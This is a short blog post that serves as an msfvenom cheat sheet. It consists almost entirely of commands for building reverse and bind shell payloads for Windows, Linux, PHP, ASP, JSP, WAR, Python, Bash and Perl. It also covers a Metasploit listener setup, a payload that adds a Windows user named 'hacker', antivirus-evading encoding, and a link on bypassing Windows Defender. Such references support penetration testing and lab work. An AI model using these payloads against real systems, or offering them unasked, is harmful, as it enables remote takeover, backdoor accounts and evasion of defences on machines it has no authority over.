---
layout: post
title: msfvenom cheatsheat
description: msfvenom cheatsheet
date: 2022-04-29
Last Updated: 
---
#### Creating a payload

`msfvenom -p [payload] LHOST=[listeninghost] LPORT=[listeningport]`

To view list of payloads: `msfvenom -l payloads`

To view the payload options: `msfvenom -p windows/x64/meterpreter_reverse_tcp --list-options`

#### Creating a payload with encoding

`msfvenom -p [payload] -e [encoder] -f [formattype] -i [iteration] <var=value> > outputfile`

#### Creating a payload using a template

`msfvenom -p [payload] <var=value> -x [template] -f [formattype] > outputfile`

#### Listening for MSfvenom Payloads:

```
msf5>use exploit/multi/handler  
msf5>set payload windows/meterpreter/reverse_tcp  
msf5>set lhost <IP>  
msf5>set lport <PORT>  
msf5> set ExitOnSession false  
msf5>exploit -j  
```

#### Windows Payloads
```
- msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
- msfvenom -p windows/meterpreter_reverse_http LHOST=IP LPORT=PORT HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -f exe > shell.exe
- msfvenom -p windows/meterpreter/bind_tcp RHOST= IP LPORT=PORT -f exe > shell.exe
- msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
- msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
```

#### Linux Payloads
```
- msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
- msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf
- msfvenom -p linux/x64/shell_bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf
- msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf
```

#### Add a user in windows with msfvenom:

`msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe`

#### Web Payloads
```
PHP

- msfvenom -p php/meterpreter_reverse_tcp LHOST= <your ip="" address="">LPORT= <your port="" to="" connect="" on="">-f raw > shell.php
    cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php</your></your>

ASP

- msfvenom -p windows/meterpreter/reverse_tcp LHOST= <your ip="" address="">LPORT= <your port="" to="" connect="" on="">-f asp > shell.asp</your></your>

JSP

- msfvenom -p java/jsp_shell_reverse_tcp LHOST= <your ip="" address="">LPORT= <your port="" to="" connect="" on="">-f raw > shell.jsp</your></your>

WAR

- msfvenom -p java/jsp_shell_reverse_tcp LHOST= <your ip="" address="">LPORT= <your port="" to="" connect="" on="">-f war > shell.war</your></your>

## Scripting Payloads

Python

- msfvenom -p cmd/unix/reverse_python LHOST= <your ip="" address="">LPORT= <your port="" to="" connect="" on="">-f raw > shell.py</your></your>

Bash

- msfvenom -p cmd/unix/reverse_bash LHOST= <your ip="" address="">LPORT= <your port="" to="" connect="" on="">-f raw > shell.sh</your></your>

Perl

- msfvenom -p cmd/unix/reverse_perl LHOST= <your ip="" address="">LPORT= <your port="" to="" connect="" on="">-f raw > shell.pl</your></your>

Creating an Msfvenom Payload with an encoder while removing bad charecters:

- msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/shikata_ga_nai -b "\x0A\x0D"

```

## Resources:

- https://hacker.house/lab/windows-defender-bypassing-for-meterpreter/